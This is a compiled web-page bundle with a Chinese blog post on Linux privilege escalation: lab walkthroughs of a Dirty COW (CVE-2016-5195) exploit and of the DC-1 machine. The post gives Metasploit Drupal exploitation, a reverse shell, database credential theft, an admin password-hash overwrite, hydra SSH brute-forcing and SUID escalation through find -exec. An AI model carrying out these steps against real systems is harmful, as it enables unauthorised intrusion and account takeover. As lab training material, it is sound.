AAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIDABwjc//v3e886dvil/v8d//58/1895/PH04EAAQIECBAgQIAAgT8X+O3r/lX6//Y5//wTspIAAQIECBAgQIAAgScFrn7d/1vn/1v7PvlxW06AAAECBAgQIEDgEwXm6/vItHySt9utTiWuBXE8J+/3//1xWorTM30OwVy865N8e4QM63nStq6qx0hBTYoJECBAgAABAgQIEHhFgcP1vU7l9l+D8TxzWX3OOlvzedmYm7SptqoNW//dsOZrnG5zsmZqnCUCAgQIECBAgAABAgSuITBf6EcmP8djpGz8SiTD9opS821hONK5Fte49czCZXBemNkEu+a1YD75PLs8jCQBAgQIECBAgAABAq8o0C70dbiMn3ztWfacX0Vq2VmtVe6GNV/jNJ+TNVPjLBEQIECAAAECBAgQIHANgXahr8Nl7LVnfK4V5xqftFMSIECAAAECBAgQ+FiBdn2vw2XstWd8VSrOx355PDgBAgQIECBAgACBCwiMu3u7wSdZ//ZsWTOeMPWtJstbPvUp+LLPjjKtxsvYuU8trvU5xvKctefuGPIECBAgQIAAAQIECLy5QHtbeP2nvdyBX5/UCQkQIECAAAECBAi8ucAl3iLqIWv85p+NxyNAgAABAgQIECBA4HmB8QpxiReJv3LUummNn5fXgQABAgQIECBAgAABAi8hUF91avwSh3MIAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgReWuAf8pEBfqNX2agAAAAASUVORK5CYII=" alt="image" loading="lazy">​</p></li></ol><h3 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集"><span>信息收集</span></a></h3><ol><li><p>kali 两种扫描存活主机方法</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">nmap </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sP </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">127.20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.10.0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">24</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">arp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">scan </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">l</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+t+'" alt="image" loading="lazy">​</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p><p>​<img src="'+A+'" alt="image" loading="lazy">​</p></li><li><p>-A : 激进型 启用许多扫描选项，版本扫描，脚本扫描等(慎用)</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p></li><li><p>访问1898端口</p></li></ol><h3 id="测试阶段" tabindex="-1"><a class="header-anchor" href="#测试阶段"><span>测试阶段</span></a></h3><ol><li><p>启动 msfconsole 输入 search Drupal寻找攻击模块</p><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><p>使用第二个，并查看当前options</p><p>​<img src="'+d+'" alt="image" loading="lazy">​</p></li><li><p>msf的设置</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p></li><li><p>主机信息收集</p><p>​<img src="'+B+'" alt="image" loading="lazy">​</p></li><li><p>使用相关探针进行探测，<a href="http://xn--linux-exploit-suggester-ol70b96gry1obz1ekg4gq2l.sh" target="_blank" rel="noopener noreferrer">这里我们使用linux-exploit-suggester.sh</a></p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">git clone https:</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">//</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">github.com</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">mzet</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">linux</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">exploit</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">suggester</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+c+'" alt="image" loading="lazy">​</p></li><li><p>​<img src="'+o+'" alt="image" loading="lazy">​</p></li><li><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><p>​<img src="'+y+'" alt="image" loading="lazy">​</p></li></ol><h3 id="提权阶段" tabindex="-1"><a class="header-anchor" href="#提权阶段"><span>提权阶段</span></a></h3><ol start="7"><li><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> git clone https:</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">//</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">github.com</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">gbonacini</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">CVE</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2016</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">5195</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+u+'" alt="image" loading="lazy">​</p></li><li><p>上传</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p></li><li><p>编译 dcow.cpp</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">g</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Wall </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">pedantic </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">o2 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">std</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">c</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">++</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">11</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">pthread </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">o dcow dcow.cpp </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">lutil</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+C+'" alt="image" loading="lazy">​</p></li><li><p>​<img src="'+I+'" alt="image" loading="lazy">​</p></li><li><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ssh root</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">172.20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.10.5</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+Q+'" alt="image" loading="lazy">​</p><p><a href="https://blog.csdn.net/weixin_68408599/article/details/132332072" target="_blank" rel="noopener noreferrer">参考连接</a></p></li></ol><p>‍</p><p>‍</p><h2 id="suid提权-dc-1" tabindex="-1"><a class="header-anchor" href="#suid提权-dc-1"><span>SUID提权-DC-1</span></a></h2><p>​<img src="data:image/png;base64,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" alt="image" loading="lazy">​</p><h3 id="信息收集-1" tabindex="-1"><a class="header-anchor" href="#信息收集-1"><span>信息收集</span></a></h3><ol><li><p>arp-scan -l​</p><p><img src="'+E+'" alt="image" loading="lazy">​</p></li><li><p>whatweb ​</p><p><img src="'+v+'" alt="image" loading="lazy">​</p><p>使用drupal-cms</p></li><li><p>nmap -sV ​</p><p><img src="'+F+'" alt="image" loading="lazy">​</p><p>开放了22、80、111</p></li><li><p>访问80端口，确定是drupal</p></li><li><p>搜索引擎搜索该框架漏洞利用方式</p></li></ol><h3 id="测试阶段-1" tabindex="-1"><a class="header-anchor" href="#测试阶段-1"><span>测试阶段</span></a></h3><ol><li><p>启动msfconsole</p></li><li><p>search drupal</p><p>​<img src="'+x+'" alt="image" loading="lazy">​</p></li><li><p>use 1 采用2018-03-28漏洞</p><p>​<img src="'+f+'" alt="image" loading="lazy">​</p></li><li><p>ls -ll 发现flag1 - cat flag1.txt - 获取shell - 使用python反弹交互式shell - cat setting.php 获得 db</p><p>​<img src="'+D+'" alt="image" loading="lazy">​</p></li><li><p>登录数据库 mysql -udbuser -pR0ck3t</p><p>​<img src="'+z+'" alt="image" loading="lazy">​</p><p>use drupaldb show tables;</p><p>​<img src="'+w+'" alt="image" loading="lazy">​</p><p>select * from users\\G;</p><p>​<img src="'+q+'" alt="image" loading="lazy">​</p></li><li><p>admin 有密码，修改。哈希</p><p>​<img src="'+L+'" alt="image" loading="lazy">​</p></li><li><p>update users set pass=&quot;$S$DUO423x5aaQdWlWoutaLSvNkVGU.EeL1FKTeQUquCBLbZsavTwTU&quot; where uid=1;<img src="'+P+'" alt="image" loading="lazy">​</p></li><li><p>登录 admin 123456 找到flag</p><p><img src="'+Z+'" alt="image" loading="lazy">​</p></li><li><p>cat /etc/passwd</p><p><img src="'+W+'" alt="image" loading="lazy">​</p></li><li><p>hydra -l flag4 -P /usr/share/john/password.lst 172.20.10.5 ssh -vV -f -o hydra.ssh</p><p><img src="'+V+'" alt="image" loading="lazy">​</p></li><li><p>使用ssh连接，发现最后一个flag的提示信息：in root</p><p><img src="'+X+'" alt="image" loading="lazy">​</p></li></ol><h3 id="提权阶段-1" tabindex="-1"><a class="header-anchor" href="#提权阶段-1"><span>提权阶段</span></a></h3><ol><li><p>进入/root 没有权限</p><p>​<img src="'+N+'" alt="image" loading="lazy">​</p></li><li><p>可用于SUID提权的文件有</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">find、bash、nmap、vim、more、less、nano、cp </span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">当没有s权限时可以使用：chmod u</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">s 命令路径，增加权限</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>find命令，先查看其信息​</p><p><img src="'+U+'" alt="image" loading="lazy">​</p></li><li><p>利用find命令随便查找一个正确的路径，后面加上 <code>-exec shell命令 \\;</code>​​</p><p><img src="'+O+'" alt="image" loading="lazy">​</p></li><li><p>提权 <code>/bin/bash</code>​ 或者 <code>/bin/sh</code>​​​<img src="'+T+'" alt="image" loading="lazy">​</p><p><a href="https://blog.csdn.net/weixin_45677119/article/details/111770003" target="_blank" rel="noopener noreferrer">参考链接</a></p></li></ol><p>‍</p>',48)]))}]]),M=JSON.parse('{"path":"/perm/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html","title":"Linux系统提权","lang":"zh-CN","frontmatter":{"title":"Linux系统提权","index":true,"icon":"l","isOriginal":true,"date":"2023-09-12T00:00:00.000Z","order":1,"category":["渗透测试"],"tag":["渗透测试","Linux系统提权"],"description":"Liux安装好系统后里面自带的软件或内核存在的漏洞，比较流行的有“脏牛提权” Linux内核提权跟Windows一样，都要下载对应漏洞的脚本进行提权 步骤 1.基础信息收集 uname -a 打印所有可用的系统信息 uname -r 内核版本 uname -m 查看系统内核架构(64/32位) cat /proc/version 内核信息 cat /e...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"Linux系统提权"}],["meta",{"property":"og:description","content":"Liux安装好系统后里面自带的软件或内核存在的漏洞，比较流行的有“脏牛提权” Linux内核提权跟Windows一样，都要下载对应漏洞的脚本进行提权 步骤 1.基础信息收集 uname -a 打印所有可用的系统信息 uname -r 内核版本 uname -m 查看系统内核架构(64/32位) cat /proc/version 内核信息 cat /e..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"Linux系统提权"}],["meta",{"property":"article:published_time","content":"2023-09-12T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Linux系统提权\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-09-12T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":2,"title":"步骤","slug":"步骤","link":"#步骤","children":[]},{"level":2,"title":"提权方法","slug":"提权方法","link":"#提权方法","children":[{"level":3,"title":"Linux内核/系统提权","slug":"linux内核-系统提权","link":"#linux内核-系统提权","children":[]},{"level":3,"title":"Linux-suid提权","slug":"linux-suid提权","link":"#linux-suid提权","children":[]},{"level":3,"title":"Linux mysql提权","slug":"linux-mysql提权","link":"#linux-mysql提权","children":[]}]},{"level":2,"title":"脏牛提权-CVE-2016-5195","slug":"脏牛提权-cve-2016-5195","link":"#脏牛提权-cve-2016-5195","children":[{"level":3,"title":"搭建阶段","slug":"搭建阶段","link":"#搭建阶段","children":[]},{"level":3,"title":"信息收集","slug":"信息收集","link":"#信息收集","children":[]},{"level":3,"title":"测试阶段","slug":"测试阶段","link":"#测试阶段","children":[]},{"level":3,"title":"提权阶段","slug":"提权阶段","link":"#提权阶段","children":[]}]},{"level":2,"title":"SUID提权-DC-1","slug":"suid提权-dc-1","link":"#suid提权-dc-1","children":[{"level":3,"title":"信息收集","slug":"信息收集-1","link":"#信息收集-1","children":[]},{"level":3,"title":"测试阶段","slug":"测试阶段-1","link":"#测试阶段-1","children":[]},{"level":3,"title":"提权阶段","slug":"提权阶段-1","link":"#提权阶段-1","children":[]}]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":5.76,"words":1729},"filePathRelative":"perm/权限提升/Linux系统提权.md","localizedDate":"2023年9月12日","excerpt":"<p>Liux安装好系统后里面自带的软件或内核存在的漏洞，比较流行的有“脏牛提权”<br>\\nLinux内核提权跟Windows一样，都要下载对应漏洞的脚本进行提权</p>\\n<h2>步骤</h2>\\n<h5>1.基础信息收集</h5>\\n<p>uname -a  打印所有可用的系统信息<br>\\nuname -r  内核版本<br>\\nuname -m  查看系统内核架构(64/32位)<br>\\ncat /proc/version  内核信息<br>\\ncat /etc/issue  发行版本信息<br>\\nwhoami  当前用户名<br>\\nid  当前用户信息</p>\\n<p>​​</p>\\n<h5>2.查找相关版本的内核漏洞</h5>","autoDesc":true}')}}]);